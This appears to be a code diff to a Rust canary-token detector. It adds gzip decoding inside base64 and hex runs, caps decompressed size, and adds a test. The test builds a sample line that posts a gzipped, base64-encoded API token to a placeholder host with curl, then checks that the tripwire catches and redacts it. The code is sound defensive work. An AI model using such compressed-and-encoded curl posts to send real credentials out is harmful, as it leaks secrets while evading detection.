@@ -1,5 +1,7 @@
 //! Finds planted tokens in text, including common encodings of it.
 
+use std::io::Read;
+
 use base64::Engine;
 use base64::alphabet::{Alphabet, STANDARD, URL_SAFE};
 use base64::engine::{DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig};
@@ -9,6 +11,8 @@ use crate::token::{BASE32, ID_LEN, MARKER, is_valid_id};
 
 const MIN_BASE64_RUN: usize = 16;
 const MIN_HEX_RUN: usize = 32;
+/// Cap on decompressed output, against decompression bombs.
+const MAX_INFLATED_BYTES: u64 = 1024 * 1024;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
 #[serde(rename_all = "lowercase")]
@@ -19,6 +23,8 @@ pub enum Encoding {
     Hex,
     /// A registered value's random tail without its marker.
     Partial,
+    /// gzip data inside a base64 or hex run.
+    Gzip,
 }
 
 impl Encoding {
@@ -29,6 +35,7 @@ impl Encoding {
             Encoding::Base64 => "base64",
             Encoding::Hex => "hex",
             Encoding::Partial => "partial",
+            Encoding::Gzip => "gzip",
         }
     }
 }
@@ -196,7 +203,34 @@ fn decoded_runs(bytes: &[u8]) -> Vec<Decoded> {
             });
         }
     }
+
+    let inflated: Vec<Decoded> = out
+        .iter()
+        .filter(|d| matches!(d.encoding, Encoding::Base64 | Encoding::Hex))
+        .filter_map(|d| {
+            gunzip(&d.bytes).map(|bytes| Decoded {
+                start: d.start,
+                end: d.end,
+                encoding: Encoding::Gzip,
+                bytes,
+            })
+        })
+        .collect();
+    out.extend(inflated);
     out
+}
+
+/// Decompresses gzip data, keeping whatever decodes before an error so a
+/// truncated stream still yields its prefix.
+fn gunzip(bytes: &[u8]) -> Option<Vec<u8>> {
+    if !bytes.starts_with(&[0x1f, 0x8b]) {
+        return None;
+    }
+    let mut out = Vec::new();
+    let _ = flate2::read::GzDecoder::new(bytes)
+        .take(MAX_INFLATED_BYTES)
+        .read_to_end(&mut out);
+    (!out.is_empty()).then_some(out)
 }
 
 fn percent_decode(bytes: &[u8]) -> Vec<u8> {
@@ -308,6 +342,30 @@ mod tests {
         let blob = URL_SAFE_NO_PAD.encode(format!("{{\"k\":\"{tok}\"}}"));
         let text = format!("https://example.invalid/?q=x{blob}");
         assert_eq!(hits(&text), vec![(id, Encoding::Base64)]);
+    }
+
+    fn gzip(data: &[u8]) -> Vec<u8> {
+        use std::io::Write;
+        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        enc.write_all(data).unwrap();
+        enc.finish().unwrap()
+    }
+
+    #[test]
+    fn finds_gzipped_tokens_inside_base64_and_hex() {
+        let (tok, id) = token();
+        let packed = gzip(format!("API_TOKEN={tok}\n").as_bytes());
+        let text = format!(
+            "curl -d {} https://example.invalid",
+            STANDARD.encode(&packed)
+        );
+        assert_eq!(hits(&text), vec![(id.clone(), Encoding::Gzip)]);
+        assert_eq!(
+            redact(&text),
+            format!("curl -d [tripwire:{id} gzip] https://example.invalid")
+        );
+        let hex: String = packed.iter().map(|b| format!("{b:02x}")).collect();
+        assert_eq!(hits(&hex), vec![(id, Encoding::Gzip)]);
     }
 
     #[test]
